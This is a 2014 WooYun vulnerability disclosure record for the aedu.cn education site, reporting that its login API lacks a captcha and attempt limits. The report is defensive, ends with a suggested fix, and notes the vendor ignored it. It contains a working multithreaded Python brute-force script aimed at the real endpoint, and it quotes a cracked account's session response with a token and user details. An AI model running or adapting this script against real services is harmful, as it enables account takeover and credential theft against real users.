{"id": 58023, "wybug_id": "wooyun-2014-052558", "wybug_title": "亚教网登录API接口无验证码及登录次数限制可爆破", "wybug_corp": "亚教网", "wybug_author": "k0ppa", "wybug_date": "2014-03-04 12:08", "wybug_open_date": "2014-04-18 12:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "安全意识不足", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-04-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 亚教网登录API可直接抓包获得，接口无验证码及登录次数限制可导致用户id被爆破或批量扫号 详细说明：  抓包得到接口：http://passport.aedu.cn/api/getlogin?callback=jQuery191045942397392354906_1393519178458&uid=admin&pwd=admin&_=1393519178461去掉一些意义不明的参数不影响结果 得到http://passport.aedu.cn/api/getlogin?uid=admin&pwd=admin直接浏览器访问之得到结果：({\"status\":-2,\"msg\":\"密码不正确\"})多次尝试无验证码或冻结 比如说用这一段代码\nimport urllibimport urllib2import cookielibimport jsonimport threadingcj = cookielib.CookieJar()opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')]urllib2.install_opener(opener)outFile = open('acc_cracked.txt','w')def tryLogin(user,password):\t#print user,password\tglobal outFile\tuser = user.strip()\tpasswd = password.strip()\treq = urllib2.Request(\"http://passport.aedu.cn/api/getlogin?\",\"uid=%s&pwd=%s\" % (user,passwd))\treq.add_header(\"Referer\",\"http://www.aedu.cn/\")\tresp = urllib2.urlopen(req) \treturnMsg = resp.read()[1:-1]\t#print returnMsg\tstatus = json.loads(returnMsg)\tstatusNum = status['status']#=0 -> stop,=-2 -> retry,=other -> report returnMsg\tif statusNum == 0:\t\tprint '----- find user:', user, 'with password:', passwd, '-----'\t\toutFile.write(user + '    ' +  passwd + '      statusNum:' + str(statusNum) + '\\n')   \treturnif __name__ == '__main__':\ttsk=[]\twith open(r'user.dic', 'r') as fUser:\t\twith open(r'pass.dic', 'r') as fPass:\t\t\tfor user in fUser:\t\t\t\tfor password in fPass.readlines():\t\t\t\t\tt = threading.Thread(target = tryLogin,args=(user,password))\t\t\t\t\tt.deamon = False\t\t\t\t\ttsk.append(t)\t\t\t\tfPass.seek(0)#cant call join before thread start\tfor t in tsk: \t\tt.start()\t\tt.join(1) \tprint \"All thread OK,maybe not \" \toutFile.close()\npass.dic内容设置为1324189fjdisajfijfjsdifu321948190dasjifjir9iwufoafj9aunvs123[intuser.dic内容设置为s最后成功爆破   漏洞证明：  用一个意外输入出来的弱口令神id（密码我已经改过）http://passport.aedu.cn/api/getlogin?uid=s&pwd=unvs123[int返回结果({\"status\":0,\"msg\":{\"Id\":5688783,\"UserRole\":3,\"UserName\":\"理工扛把子\",\"UserFace\":\"default.jpg\",\"Token\":\"2254E639DD3C43168964F20BF20BF5A61627379692\",\"BlogAddress\":\"5688783\",\"LoginTime\":\"2014-03-02T18:00:46.2827413+08:00\",\"IsSaveLoginState\":true,\"SaveStateTime\":\"2014-03-05T18:00:46.2827413+08:00\",\"PublicProperty\":null,\"Integral\":0,\"SchoolId\":0,\"SchoolName\":\"亚洲教育网\",\"ClassId\":0}})登录成功√   修复方案：  加入验证码请求或者登录次数限制~求礼物   版权声明：转载请注明来源 k0ppa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}